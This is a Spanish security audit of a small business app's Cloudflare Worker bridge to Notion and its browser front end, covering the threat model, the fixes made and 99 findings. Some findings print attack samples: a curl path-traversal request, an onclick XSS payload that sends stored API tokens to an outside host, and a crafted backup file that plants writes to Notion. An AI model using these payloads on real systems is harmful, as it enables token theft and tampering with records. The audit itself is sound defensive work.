# Auditoría de seguridad — agosto de 2026

Esto salió de la mudanza a Cloudflare. La pregunta original era corta —«ya conecté
Cloudflare, ayúdame a subirlo»— y publicar en un sitio que sí deja poner cabeceras obligaba a
decidir una política de contenido, que a su vez obliga a saber a dónde sale cada dato de esta
app. De ahí a auditarlo entero hay un paso, y se dio.

**Cómo se hizo, para que se sepa cuánto pesa.** Nueve revisiones en paralelo, cada una con una
parte distinta —el Worker del puente por tres lados, la CSP, el DOM, las llaves, el service
worker, la plataforma de Cloudflare, la cadena de suministro— y encima un crítico de
completitud buscando lo que las nueve no miraron. Cada hallazgo pasó después por un juez
adversarial con tres lentes: si el código dice de verdad lo que la evidencia afirma, si lo
puede provocar alguien que no tenga ya el teléfono desbloqueado en la mano, y si el arreglo
es proporcionado a un taller de tres personas. **De 122 hallazgos, 23 se refutaron.**
Quedan 99, y muchas de las severidades que se leen abajo son más bajas que las que propuso
quien encontró el hallazgo: eso es el juez haciendo su trabajo.

Las cifras no son el producto. Un informe con 99 renglones donde todos pesan igual es un
informe que nadie usa. Por eso está ordenado por lo que hay que hacer, no por dónde apareció.

---

## Lo primero: el modelo de amenaza de verdad

Antes de la lista conviene decir contra qué se está defendiendo esto, porque cambia qué
importa y qué es teatro.

**Los datos no están en un servidor.** Viven en el teléfono de cada quien: `localStorage` e
IndexedDB del cotizador y de la plataforma. No hay base de datos que hackear, no hay sesión
que robar, no hay endpoint que enumerar. El sitio publicado es HTML y JavaScript que ya es
público en GitHub.

**Solo hay un secreto en todo el sistema**, y no está en el sitio: el `NOTION_TOKEN` del
Worker, que es escritura total sobre el workspace de Notion. Vive en Cloudflare. Lo único que
lo guarda es la contraseña de esa cuenta.

**Y solo hay una frontera de permisos real**: el token de dispositivo del puente, que mapea
teléfono a rol. Cambiar el rol en la pantalla de Ajustes da otro tablero, no da permisos.

De ahí salen las tres consecuencias que ordenan todo lo demás:

1. **El riesgo más grande de esta mudanza no es un atacante: es perder los datos.** El
   navegador guarda por origen. `github.io` y `pages.dev` son dos. Tres años de cotizaciones,
   el contador de folios, la agenda y el libro del almacén no cruzan solos, y lo que esté sin
   mandar a Notion no entra en ningún respaldo. Los dos únicos hallazgos **críticos** de este
   informe son ese, visto desde dos lados.
2. **Lo segundo más grande está en la cuenta de Cloudflare**, no en el código. Un secreto no
   se puede leer del panel, pero sí sobrescribir: quien entre puede escribirse un `TOKENS`
   nuevo con rol de dirección. La verificación en dos pasos de esa cuenta cuesta tres minutos
   y vale más que la mitad de este documento.
3. **Casi todo lo que sigue exige ya ser una de las tres personas**, o tener el teléfono
   desbloqueado. Eso no las vuelve irrelevantes —un empleado que se va, un teléfono robado,
   un respaldo reenviado por WhatsApp son escenarios reales de un negocio— pero sí las pone
   en su lugar, y por eso hay tan pocas «altas» y tantas «bajas».

---

## Qué se arregló, y qué sigue abierto

**Este informe se escribió antes de arreglar nada, y después se arregló casi todo lo grave.**
Se conserva completo —los 99 hallazgos, no solo los que quedan— porque un informe podado no
deja ver qué se decidió no hacer, y eso es la mitad de lo que hay que saber dentro de un año.
Lo que ya no aplica se marca aquí arriba; lo de abajo se lee sabiendo esto.

### Los dos críticos

Los dos son el mismo hecho visto por dos lados —el navegador guarda por origen, y `github.io`
y `pages.dev` son dos— y **no son de código: son de procedimiento**. Siguen abiertos porque
solo se cierran haciendo la mudanza bien, y el procedimiento teléfono por teléfono está en
`docs/CLOUDFLARE.md` §5.

### Lo que ya está cerrado, con prueba

| Estaba | Ahora |
|---|---|
| Doce `onclick` armados por interpolación con el folio o la clave del cliente. `esc()` no protegía: el analizador de HTML decodifica el `&#39;` antes de compilar el atributo como JavaScript | El dato viaja en `data-folio`/`data-clave` y el manejador lo lee con `this.dataset`. `pruebas/navegador/inyeccion.mjs` envenena `localStorage` como lo haría un respaldo manipulado y comprueba que no ejecuta |
| Un decimotercer sitio que no estaba en el informe: `it.id`, en una treintena de manejadores por partida, entrando crudo desde el archivo por tres puertas | `sanearIds()` lo convierte en número en las tres puertas y otra vez al pintar |
| pdf.js 3.11.174 desde cdnjs, sin integridad, con el CVE que ejecuta JavaScript desde un PDF preparado — y los PDF los manda el cliente | pdf.js 4.10.38 en `vendor/pdfjs/`, copiado a mano como Leaflet, con `isEvalSupported:false`. `cdnjs` salió de `script-src`. Leer un PDF **puede** funcionar sin señal, que antes nunca: el lector son 1.8 MB que NO van en la precarga —`addAll` es todo-o-nada y jugarse ahí la caché de la app por el lector sería cambiar lo primero por lo segundo— así que se guarda la primera vez que alguien abre un PDF **con** señal, y hay que volver a bajarlo tras cada subida de `APP_VERSION`. El mensaje distingue el caso. `pruebas/navegador/pdf.mjs` abre uno de verdad, con las URL limpias de Pages, y cubre además el reintento tras un fallo |
| `/jalar` devolvía la fila entera del dinero a cualquier rol | Manda solo los seis campos que el cliente consume, y la lista salió de leer `deNotion`, no de una opinión. Los **importes crudos** —`Anticipo`, `Liquidacion`, `Precio Subtotal`, `Abono Comision`, `Comisiones`, `Precio Neto `— ya no salen de Notion por ninguno de los tres tokens. **Con una salvedad que hay que decidir, no tapar:** el espejo de cobranza (`Estatus`, `Cuenta `, `Pago Pendiente`, `Comision Restante`) le sigue llegando también a fabricación, porque el cliente lo pide para los tres teléfonos por decisión explícita del dueño (`js/datos/puente.js`). Si fabricación no debe ver cuánto debe cada cliente, hay que partir `LEGIBLES_JALAR` en dos — es un cambio de cinco líneas, pero es una decisión del negocio y no de una auditoría |
| `op.id_notion` se concatenaba crudo a la ruta de la API de Notion; `../databases/` convertía un PATCH de fila en otra cosa | Se exige forma de UUID, y se dice cuando no la tiene en vez de callarlo |
| Dar de alta una venta solo estaba prohibido en el cliente | El candado está en el Worker |
| Un origen fuera de `ORIGENES` recibía el primero de la lista, así que un dominio mal escrito se veía igual que «no hay señal» | Se niega. El diagnóstico existe |
| `TOKENS` con una coma de más daba 401 mudo a los tres teléfonos | Da 500 nombrando el problema, y nombra también el rol mal escrito |
| Importes sin rango: negativos y `1e21` entraban a la base del dinero | Rango, con el motivo escrito |
| `/expandir` — riesgo sin función: `redirect:'follow'` con los saltos elegidos por un tercero | Borrado. Nadie lo llamaba |
| Restaurar un respaldo escribía en la bandeja de salida, y el relevo la bombea sola a Notion | `importar()` la salta, como `exportar()` ya hacía |
| `Gcal.pedirToken()` devolvía el access_token de Google en claro a cualquier módulo del origen | Devuelve solo la caducidad —`llamar()` usa `_tok` del ámbito del módulo, así que nadie lo perdía—. Y ya no deja la promesa colgada: tiene `error_callback` y dos topes de reloj, 30 s para la renovación silenciosa y 5 min para el consentimiento, porque la pantalla de «Google no ha verificado esta app» tarda minutos en un teléfono viejo y un tope único la cortaba a media aceptación. **Sin prueba automatizada: nada de `pruebas/` carga `js/nucleo/gcal.js`.** Y sigue abierto lo de abajo |
| `urlMapa()` no filtraba el esquema; `agenda.js` sí, dos archivos más allá | Filtrado, con `pruebas/enlaces.mjs` corriendo los dos constructores contra seis esquemas |
| La key de Gemini viajaba en la query | En cabecera, como las otras dos |
| Ni una cabecera de seguridad, porque GitHub Pages no las deja poner | `_headers`, validado en Chromium con cero violaciones |
| No existía aviso de privacidad, y la app trata datos que la LFPDPPP considera personales | `privacidad.html` en borrador, y la advertencia de a dónde va la foto del cliente puesta en la pantalla donde alguien decide usar la IA |
| El runner de pruebas salía con código 1 con todo en verde, de forma intermitente | Arreglado |

### Lo que sigue abierto a propósito

- **La mudanza de origen** (los dos críticos). Procedimiento, no código.
- **La mitad del cliente del rango de importes**: dejar de mandar `Anticipo: 0` exige decidir
  antes si `Anticipo` significa lo pactado o lo recibido. Es una decisión del negocio.
- **Los datos de identidad del aviso de privacidad**, que solo los tiene el dueño.
- **Los topes de gasto de OpenRouter y Groq**, que se ponen del lado del proveedor.
- **La verificación en dos pasos de Cloudflare**, que sigue siendo lo más valioso por minuto
  invertido de todo este documento.
- **`Gcal.pedirToken()` sigue exportada y sin mirar el rol.** Ya no devuelve el token, pero un
  script del mismo origen puede llamarla y acuñar uno: `llamar()` lo toma de `_tok`, que queda
  puesto. En el teléfono de Dirección eso es escribir y borrar eventos en el calendario del
  director. Cerrarlo es una guarda de rol al principio de la función; no se puso porque hoy no
  hay ninguna prueba que cargue ese módulo y tocarlo a ciegas es cómo se rompe el calendario.
- Y las **bajas e informativas** de abajo, que son deuda e higiene y están donde deben estar.

---

## Qué se arregló en la primera pasada

Cuatro cosas, todas en el repositorio y todas con prueba:

- **`_headers`** — la política de contenido y las seis cabeceras de seguridad que GitHub
  Pages nunca dejó poner. La CSP lista los nueve destinos a los que un dato puede salir, y
  esa es la directiva que de verdad importa cuando lo que se teme es que algo se lleve la
  información de los clientes.
- **`js/mod/proyectos.js`** — `urlMapa()` devolvía `maps_url` crudo a un `href`.
  `js/mod/agenda.js` filtraba el esquema dos archivos más allá; este no. Un `javascript:`
  llegado de un respaldo restaurado o de una fila de Notion se ejecutaba al tocar «Ver en
  Maps».
- **`robots.txt`** — deja rastrear a propósito, para que el `noindex` de la cabecera se
  llegue a leer. Un `Disallow: /` habría dado lo contrario de lo que se quería.
- **Tres pruebas nuevas**: `pruebas/cabeceras.mjs` (ata la CSP al código en los dos
  sentidos), `pruebas/navegador/csp.mjs` (sirve el sitio con las cabeceras reales en Chromium
  y caza violaciones, incluida la apertura sin señal con las URL limpias de Pages) y
  `pruebas/enlaces.mjs` (corre los constructores de enlaces contra seis esquemas peligrosos).
  Las tres se verificaron al revés: rompiendo lo que vigilan, para ver que fallan.

**Los diez parches del Worker ya están aplicados en `puente/worker.js`**, con su antes, su
después y su motivo en `puente/ENDURECIMIENTO.md`, y `pruebas/worker.mjs` pasó de 88 a 133
aserciones cubriéndolos. Lo que falta es **pegarlo en Cloudflare**, porque el Worker no se
despliega desde este repositorio, y ahí el orden no es negociable: primero `ORIGENES` con los
dos dominios y Deploy, después el código. Al revés deja a los tres teléfonos sin sincronizar.
El orden completo está al principio de ese documento.

---

## El orden en que conviene hacer lo demás

Nada de esto es urgente en el sentido de «hay alguien adentro». Está ordenado por lo que
cuesta perder contra lo que cuesta arreglar.

**Hoy, y son minutos:**

1. **Verificación en dos pasos en la cuenta de Cloudflare.** *My Profile → Authentication.*
   Es lo único que guarda el token de Notion.
2. **Guardar el JSON de `TOKENS`** en un gestor de contraseñas. Sin él, revocar el token de
   un teléfono robado deja de ser editar una línea y pasa a ser regenerar los tres y volver a
   visitar los tres aparatos.
3. **Topes de gasto en OpenRouter y Groq**, y apagar la recarga automática. Una key de IA en
   un teléfono es dinero del dueño, y el límite solo se puede poner del lado del proveedor.

**Antes de mover a nadie al dominio nuevo** — el procedimiento completo está en
`docs/CLOUDFLARE.md` y no se resume bien, pero el orden no se puede invertir:

4. Bandeja de salida en cero en los tres teléfonos, y los dos respaldos bajados de cada uno.
5. `ORIGENES` del Worker con **los dos** dominios, y redesplegar.
6. El origen nuevo dado de alta en Google Cloud, o el calendario devuelve `origin_mismatch`.

**Cuando haya un rato, en este orden de valor:**

7. **Los parches 1, 2, 5 y 8 del Worker** (`puente/ENDURECIMIENTO.md`): que un origen no
   permitido se niegue en vez de sustituirse, `Cache-Control: no-store` en las respuestas con
   dinero, la comparación de tokens sin corte, y un `LEGIBLES` por rol para que `/jalar` deje
   de entregarle a fabricación los importes de todas las ventas.
8. **Auto-hospedar pdf.js en `vendor/`**, como ya se hizo con Leaflet. Cierra tres hallazgos
   de golpe y además hace que leer un PDF funcione sin señal, que hoy no funciona.
9. **Los doce `onclick` que se arman por interpolación** en `index.html`. La plataforma ya
   resolvió esto bien con delegación y `data-*`; es portar el patrón que ya existe.
10. **Un aviso de privacidad de una pantalla.** Es la carencia más barata de arreglar de todo
    el informe y la única que un cliente molesto convierte en un expediente.

---

## Los hallazgos

Ordenados por área. Dentro de cada una, lo grave primero. Cada uno lleva el archivo y la
línea, y donde el juez corrigió el arreglo propuesto, se dice.

### El puente a Notion

*31 hallazgos: 5 altas · 6 medias · 13 bajas · 7 informativas.*

#### [alta] op.id_notion se usa para armar la ruta de la API de Notion sin validar formato ni pertenencia a la base

`puente/worker.js:388, 404, 412`

Dos ataques con un solo token de dispositivo, el de fabricación incluido. (a) Sin caracteres raros: `id_notion` con el id de CUALQUIER página del workspace que la integración vea. El README (líneas 47-50) indica compartir la página PADRE «Finanzas - AL3D (ELIAS)» para que herede el acceso, así que el NOTION_TOKEN ve todo lo que cuelga de ahí, no solo Ventas - AL3D. El Worker hace el PATCH sin preguntar de qué base es la fila. (b) Con travesía de ruta: `id_notion: '../databases/<id>'` hace que `fetch` normalice la URL a `https://api.notion.com/v1/databases/<id>` y convierta un PATCH de fila en un PATCH de ESQUEMA — exactamente lo que las líneas 26-29 juran que este Worker nunca hace, y que es lo que protege las siete vistas y las cinco fórmulas.

**Arreglo.** En la línea 388, antes de usarlo: rechazar con DATO_INVALIDO todo `id_notion` que no case `^[0-9a-f]{8}-?[0-9a-f]{4}-?[0-9a-f]{4}-?[0-9a-f]{4}-?[0-9a-f]{12}$` (normalizando guiones), y además confirmar pertenencia — hacer el `GET /pages/<id>` siempre (no solo cuando viene `esperado`) y comprobar que `cuerpo.parent.data_source_id` (o `database_id`) sea `ds` antes de cualquier PATCH. Lo mismo para el id que devuelve `buscarPorFolio`, que ese sí viene de la propia consulta y está a salvo. **El verificador matiza:** De los dos arreglos, el que de verdad cierra el agujero es la comprobación de pertenencia; la regex del UUID sola ya mata la travesía y cuesta una línea, así que hazla primero. Ojo con el costo del segundo: hoy el GET de la línea 404 es CÓDIGO MUERTO porque el cliente nunca manda `esperado` a propósito (está razonado en js/datos/puente.js:25-35). Hacerlo obligatorio agrega una subpetición por operación a un Worker que ya tiene el tope de 50 del plan gratuito encima (ver hallazgo 14).

#### [alta] Los importes se aceptan sin rango: negativos y cantidades absurdas entran directo a la base del dinero

`puente/worker.js:248-251`

El Worker valida con rigor que `Estatus`, `Cuenta `, `Etapa de obra` y `Tipo de trabajo` sean valores reales de la base —porque un valor inventado ensucia el esquema— y a los cuatro campos que SON el dinero les pide solamente que sean finitos. Un token de pagos (o el de dirección, o cualquiera que se los robe) manda `{"Anticipo": -400000}` o `{"Liquidacion": 1e15}`: Notion lo acepta, y las cinco fórmulas —`Precio Neto `, `Pago Pendiente`, `Comisiones`, `Comision Restante`— recalculan encima. Combinado con la falta de bitácora, el número queda mal sin autor y sin fecha. El caso accidental también existe: un `Number('')` da 0, que es finito, y borra un anticipo de golpe.

**Arreglo.** En la línea 249, después del `isFinite`: rechazar `n < 0` («un importe no puede ser negativo») y `n > 10000000` («ese importe está fuera de rango; si es correcto, captúralo en Notion a mano»), y tratar `valor === ''` como rechazo explícito en vez de 0. Tres líneas, y el tope alto no estorba a nadie en un negocio con $3.7M acumulados. **El verificador matiza:** El arreglo del Worker está bien pero es la mitad de atrás. La mitad de adelante, que es donde está la pérdida real, es js/datos/puente.js:162: no mandar `Anticipo` cuando `p.anti_pactado` es null/undefined, en vez de mandar 0. Y en el Worker, el rechazo por `valor === ''` no basta — el cliente manda un 0 numérico, no una cadena vacía. Considera que el rol dirección solo pueda BAJAR un importe a 0 mandándolo explícitamente, no como efecto colateral de `num()`.

#### [alta] Al mudar a Cloudflare Pages, ORIGENES por omisión sigue apuntando a github.io; y un origen no permitido no se rechaza, solo se le contesta con otro origen

`puente/worker.js:136-141 y 303`

Dos cosas distintas. La operativa, que va a pasar esta semana: al publicar en Cloudflare Pages el sitio pasa a `<algo>.pages.dev` (y luego al dominio propio), que no está en `ORIGENES`; los tres teléfonos van a ver «No se pudo llegar al puente» (js/datos/puente.js:285) sin que nadie relacione el mensaje con la mudanza. Hay que agregar el dominio nuevo al secreto ANTES de mudar, y no quitar el de github.io hasta que los tres teléfonos hayan abierto la versión nueva. La de diseño: cuando el `Origin` no está en la lista, el Worker no rechaza la petición — la ejecuta completa (crea o modifica la fila en Notion) y solo devuelve una cabecera CORS que el navegador del atacante no puede usar para LEER la respuesta. La escritura ya ocurrió. Hoy no es explotable porque el `Authorization` fuerza preflight, pero el orden correcto es rechazar antes de actuar.

**Arreglo.** (1) Poner en `ORIGENES` la lista completa separada por comas, incluyendo el dominio de Pages y el propio, antes de la mudanza. (2) En la línea 303, si hay cabecera `Origin` y no está en la lista, devolver 403 ahí mismo en vez de seguir. (3) Quitar el valor por omisión codificado de la línea 137: si falta `ORIGENES`, que falle ruidosamente en vez de heredar en silencio un dominio que quizá ya no es el suyo. **El verificador matiza:** El orden importa y el hallazgo lo tiene bien; hazlo así y no al revés. Pero el arreglo (3) —quitar el valor por omisión de la línea 137— NO lo hagas en la misma pasada: si lo quitas y ORIGENES no está puesto todavía, `lista[0]` queda en cadena vacía y el ACAO sale vacío, que rompe a los tres teléfonos con el mismo síntoma que estás tratando de evitar.

#### [alta] El cliente elige a qué endpoint de Notion pega el Worker: op.id_notion se concatena crudo en la ruta

`puente/worker.js:388, 404 y 412`

Con CUALQUIER token de dispositivo (incluso el de `fabricacion`, el de menor privilegio) se manda: curl -X POST https://<worker>.workers.dev/empujar -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{"ops":[{"id":"1","id_notion":"../databases/56fa21d8-8e7d-4e16-b874-455fd6c65643","datos":{"Ubicacion":"x"}}]}' `armarPropiedades` deja pasar `Ubicacion` (está en la lista blanca de los tres roles), `props` no queda vacío, no hay `esperado` así que se salta el chequeo de concurrencia, y la línea 412 dispara un PATCH contra /v1/databases/... en vez de /v1/pages/... — con el token de escritura total y con `{properties:{...}}` en el cuerpo, que es exactamente la forma del endpoint que MODIFICA EL ESQUEMA de la base. Es decir: la promesa número 1 de la cabecera del archivo («NO altera el esquema de Notion») la rompe el propio código con un `../`.

**Arreglo.** Validar el id antes de usarlo, en la línea 388: const idPagina = /^[0-9a-fA-F]{8}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{12}$/.test(String(op.id_notion || '')) ? String(op.id_notion) : null; y rechazar con DATO_INVALIDO si venía algo y no pasó (no silenciarlo, o un id malo se convertiría en un alta duplicada). Además, en `notion()` construir la URL con `encodeURIComponent` sobre el segmento, no por concatenación. **El verificador matiza:** Dos afirmaciones de la evidencia hay que corregir. Primera: «`Ubicacion` está en la lista blanca de los tres roles» es falso. En worker.js:121-131, `pagos` es [Anticipo, Liquidacion, Abono comision, Estatus, Cuenta, Fecha liquidacion] y NO incluye `Ubicacion`; con el token de pagos habría que usar `Anticipo`. Con `direccion` y `fabricacion` sí funciona tal cual. Segunda: que el PATCH a /v1/databases/<id> MODIFIQUE el esquema no está verificado, y probablemente no ocurra tal cual.

#### [alta] La mudanza a Cloudflare Pages: qué se rompe exactamente y en qué orden hacerla para no quedarse a medias

`configuración de Cloudflare + puente/worker.js:137`

Se rompen tres cosas, y solo la primera es de CORS. UNO: desde https://<algo>.pages.dev el Origin ya no está en ORIGENES, el Worker devuelve el ACAO del dominio viejo (worker.js:140), el navegador bloquea todo y el cliente lo reporta como «puede que no haya señal, o que a este dominio le falte estar en ORIGENES» (js/datos/puente.js:284): la sincronización se detiene entera, aunque el Worker esté perfecto. DOS, y es peor: para el navegador pages.dev es OTRO origen, así que el localStorage y el IndexedDB del sitio viejo NO viajan. Cada teléfono abre el sitio nuevo vacío —sin puente, sin proyectos, sin almacén— y hay que volver a pegar URL y token; el token guardado no se puede leer del teléfono ni sale en el respaldo, hay que sacarlo del secreto TOKENS de Cloudflare o regenerar los tres.

**Arreglo.** Orden exacto, sin saltarse ninguno: (1) En cada uno de los tres teléfonos, TODAVÍA en github.io: Ajustes → «Mandar lo que está pendiente» hasta que el contador de pendientes quede en 0, y bajar el respaldo de la plataforma. (2) En Cloudflare → Worker puente-al3d → Settings → Variables: ORIGENES = 'https://eliasgaribi-ctrl-z.github.io,https://<nuevo>.pages.dev' — LOS DOS a la vez, separados por coma, sin barra final. Deploy. **El verificador matiza:** Dos correcciones y una ampliacion, todas verificadas. (a) El paso 4 dice que si el token se perdio 'hay que sacarlo del secreto TOKENS de Cloudflare': no se puede. puente/README.md:61 lo pone como Secret encriptado y un Secret no se relee desde el panel. La unica salida es regenerar los tres desde Ajustes → 'Generar los tres tokens' (ajustes.js:602; puente/README.md:70-74 avisa que se ven una sola vez), pegar el JSON nuevo en TOKENS y repartirlos.

**De severidad media:**

- **/jalar entrega la base del dinero completa a cualquier rol, incluido fabricación** — `puente/worker.js:348-365 (y aplanar en 274-299)`  
  Definir un `LEGIBLES` por rol paralelo a `ESCRIBIBLES` y filtrar la salida de `aplanar` antes de devolverla en /jalar: `fabricacion` sin las cinco fórmulas, sin `Anticipo`, `Liquidacion`, `Abono Comision`, `Precio Subtotal`, `IVA` y `Cuenta `; `pagos` sin la logística si aplica.
- **Cualquier rol puede CREAR filas nuevas en la base del dinero; el candado está solo en el cliente** — `puente/worker.js:394-397 (candado real en js/datos/puente.js:460-464)`  
  Mover el candado al Worker: en la línea 395, si `!idPagina`, exigir que el rol tenga `P.proyecto` en su lista blanca y que `props[P.proyecto]` venga con contenido; si no, `resultados.push({ id: op.id, ok:false, codigo:'ROL_SIN_PERMISO', mensaje:'Este teléfono no puede dar de alta ventas: eso sale del de Dirección.'…
- **No hay forma de revocar el token de un teléfono robado sin regenerar los tres y volver a visitar los tres teléfonos** — `puente/worker.js:157-165 y 44-45 (doc); generador en js/datos/puente.js:641-649`  
  Dos cosas, ninguna cara: (1) que el generador de Ajustes ofrezca «regenerar solo el de fabricación» reconstruyendo el JSON completo a partir de los tres valores que sigue mostrando en pantalla, y que el README diga «guarda este JSON en tu gestor de contraseñas antes de salir»; (2) meter caducidad en el propio token:…
- **Ninguna escritura deja rastro de qué teléfono la hizo: en Notion todo aparece firmado por la integración** — `puente/worker.js:167-181 y 368-428`  
  Mínimo viable, gratis: `console.log(JSON.stringify({ ts: Date.now(), rol, ruta, ids: ops.map(o=>o.id), props: Object.keys(props), estado: r.estado }))` en /empujar (después de 414) — los logs se ven en el panel de Cloudflare y se pueden mandar a Logpush.
- **El token de dispositivo es la única frontera, no caduca, no tiene límite de tasa y vive en localStorage plano** — `puente/worker.js:136-141 y 157-165`  
  Tres cosas, en este orden: (1) rechazar de verdad por origen — si `req.headers.get('Origin')` existe y no está en la lista, devolver 403 antes de tocar Notion; (2) meter límite de tasa por token con Cloudflare Rate Limiting o un Durable Object (p. ej.
- **/jalar no aplica el rol: el token de Fabricación se baja por curl el dinero de todas las ventas** — `puente/worker.js:348-365`  
  Filtrar la lectura por rol en /jalar, con la misma idea que ESCRIBIBLES: definir un LEIBLES por rol y, antes del map de worker.js:362, quitar de cada objeto de aplanar() las claves que el rol no puede leer (para fabricacion: P.subtotal, P.iva, P.neto, P.anticipo, P.liquidacion, P.abonoCom, P.pendiente, P.comisiones,…

**Lo demás, una línea cada uno:**

| | Qué | Dónde |
|---|---|---|
| baja | Sin límite de tasa: la fuerza bruta no es el riesgo, agotar las 100,000 peticiones diarias sí | `puente/worker.js:301-319 (todo el `fetch`, no hay nada)` |
| baja | Los mensajes de error de Notion y las excepciones internas se devuelven al cliente tal cual | `puente/worker.js:223-224 y 444-445` |
| baja | Si TOKENS trae JSON inválido, el puente contesta 401 a todo con el mensaje equivocado | `puente/worker.js:162 y 310-319` |
| baja | /expandir sigue redirecciones a cualquier host, sin timeout ni límite de saltos | `puente/worker.js:431-439` |
| baja | El Worker manda Retry-After y el cliente lo ignora | `puente/worker.js:359-360 y 419-422 (cliente en js/datos` |
| baja | /expandir solo valida el PRIMER salto: los otros 20 los elige un tercero y se siguen a ciegas | `puente/worker.js:433-438` |
| baja | /expandir no lo llama nadie: es riesgo puro sin ninguna función | `puente/worker.js:430-439` |
| baja | El 500 devuelve el mensaje crudo de la excepción y convierte /expandir en un oráculo de reconocimiento | `puente/worker.js:442-446` |
| baja | /expandir ignora el rol: el token de fabricación tiene la misma capacidad de proxy que el de dirección | `puente/worker.js:431-439` |
| baja | /empujar puede pedir hasta 75 subpeticiones en una sola invocación y reventar el tope del plan | `puente/worker.js:373-426` |
| baja | El ACAO de respaldo (lista[0]) NO deja que otra página lea la respuesta, pero convierte un dominio mal configurado en un fallo indistinguible de "no hay señal" | `puente/worker.js:140` |
| baja | Ninguna respuesta lleva Cache-Control ni Vary: Authorization; /jalar devuelve por GET el dinero y las direcciones de los clientes | `puente/worker.js:151-154` |
| baja | CORS no es autenticación: el puente contesta a curl sin Origin, y eso es correcto — lo que falta es límite de tasa y forma de saber que pasó | `puente/worker.js:315-319` |
| informativa | Las respuestas con dinero salen sin Cache-Control: no-store | `puente/worker.js:151-154` |
| informativa | /empujar acepta lotes de 25 operaciones que en el plan gratuito reventarían el límite de 50 subpeticiones | `puente/worker.js:373, 391, 404, 412` |
| informativa | La regex de /expandir sí es estricta en el primer salto, pero está desalineada con la del cliente | `puente/worker.js:433 frente a js/datos/geo.js:54` |
| informativa | Informativo: fetch(u) no reenvía cabeceras, así que ni NOTION_TOKEN ni el token de dispositivo se filtran al destino | `puente/worker.js:436` |
| informativa | El preflight OPTIONS revela el dominio del panel y permite enumerar ORIGENES sin ningún token | `puente/worker.js:304` |
| informativa | Responder el preflight OPTIONS antes de validar el token es CORRECTO y no debe cambiarse | `puente/worker.js:304` |
| informativa | Falta Access-Control-Allow-Credentials — y NO hace falta: agregarlo sería empeorarlo | `puente/worker.js:142-150` |

### El cotizador y la plataforma

*13 hallazgos: 3 altas · 6 medias · 3 bajas · 1 informativa.*

#### [alta] esc() no protege el contexto JavaScript: 12 onclick de index.html ejecutan código a partir del folio o del nombre del cliente

`index.html:3810 (esc) y los sinks en 5584, 8990, 9009, 9010, 9011, 9352, 9388, 9389, 9403, 9404, 9405, 9530`

Dos entradas, las dos cruzan frontera de confianza. ENTRADA A — el nombre del cliente. index.html:9210 arma la clave del cuaderno como 'nom:'+normNom(e.cliente), y normNom (index.html:4222) solo hace trim, toLowerCase y colapsar espacios: no quita nada. Un cliente capturado (a mano, o extraído por la IA de un PDF que mandó el propio cliente — applyAi en index.html:7649 asigna Q.cliente=aiTxt(p.cliente), que solo hace .trim()) con el valor: ');fetch('https://x.mx/?k='+localStorage.getItem('al3d_pf_puente')+'|'+localStorage.getItem('al3d_kxs_gemini'));// se guarda en el historial al autorizar, y al abrir Clientes index.html:9352 pinta: onclick="abrirCuaderno('nom:&#39;);fetch(...);//')" El navegador decodifica &#39; a ' al leer el atributo, así que el JavaScript que compila es: abrirCuaderno('nom:'); fetch(...); //').

**Arreglo.** Dejar de armar manejadores por interpolación. La plataforma ya resolvió esto bien y no hay que inventar nada: usa delegación con atributos data-* (js/mod/proyectos.js:751 clicFicha, js/mod/ajustes.js:736) y ahí esc() SÍ basta, porque un atributo data- es contexto HTML y la comilla doble está escapada. Convertir los 12 sitios a `data-folio="${esc(...)}"` / `data-clave="${esc(...)}"` más un solo addEventListener por modal (histmodal, climodal, la cola de autorización). Parche mínimo si hace falta cerrar hoy: pasar el valor por JSON.stringify y luego escapar, p. ej. **El verificador matiza:** Bajo de crítica a alta. Es un defecto real y confirmado, y esc() en un on* da una falsa sensación de cerrado que el propio comentario de index.html:3807-3809 documenta como resuelto cuando no lo está. Pero para llegar a datos o dinero hace falta que alguien del taller pegue/capture el texto del atacante como nombre de cliente (o restaure un respaldo ajeno, que ya es una entrega voluntaria de todo), y encima que esa cotización no traiga teléfono de 10 dígitos. No es un tercero llegando solo.

#### [alta] Restaurar un respaldo de la plataforma escribe directo en la bandeja de salida, y el bombeo automático la manda a Notion con el token de ese teléfono

`js/datos/db.js:364 (y la asimetría con js/datos/db.js:303-304)`

Alguien manda por WhatsApp un archivo llamado `plataforma-al3d-respaldo-2026-08-20.json` («el respaldo que me pediste», o el de un teléfono que ya salió del negocio). Adentro va `{"app":"plataforma-al3d","formato":1,"datos":{"proyectos":[{"id":"p-x","nombre":"…","notion_page_id":"<uuid de otra fila de Notion>"}],"pendientes":[{"id":"op-x","estado":"pendiente","tipo":"actualizar","almacen":"proyectos","datos":{"id":"p-x","anti_pactado":0,"estatus_notion":"LIQUIDADO"},"ts":1}]}}`. Dirección lo abre en Ajustes → Restaurar. No hay confirmación. En el siguiente arranque o en cuanto vuelve la señal, `bombear()` manda esa operación con el Bearer del teléfono y el Worker la aplica dentro de la lista blanca de `direccion` (worker.js:121-126), que incluye Anticipo, Liquidacion, Precio Subtotal, IVA, Estatus y Cuenta.

**Arreglo.** Una línea en `js/datos/db.js:364`, copiando la que ya existe en :304: `for (const a of ALMACENES) { if (a === 'pendientes') continue;`. Con eso el respaldo deja de ser un canal de escritura hacia Notion y no se pierde nada, porque `exportar()` tampoco lo incluye. Dos añadidos baratos en el mismo cambio: (1) descartar en el bucle de db.js:369 cualquier fila cuya llave empiece con `_`, para que no se pueda plantar `_marcas`; (2) para el almacén `proyectos`, vaciar `notion_page_id` si no casa `^[0-9a-fA-F]{8}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{4}-?[0-9a-fA-F]{12}$`.

#### [alta] Gcal.pedirToken() está exportada, no mira el rol y devuelve el token de Google en claro: cualquier script del propio origen se lleva un Bearer sobre TODOS los calendarios del director

`js/nucleo/gcal.js:132-172 (pedirToken), js/nucleo/gcal.js:47 (SCOPE), js/nucleo/gcal.js:163-164`

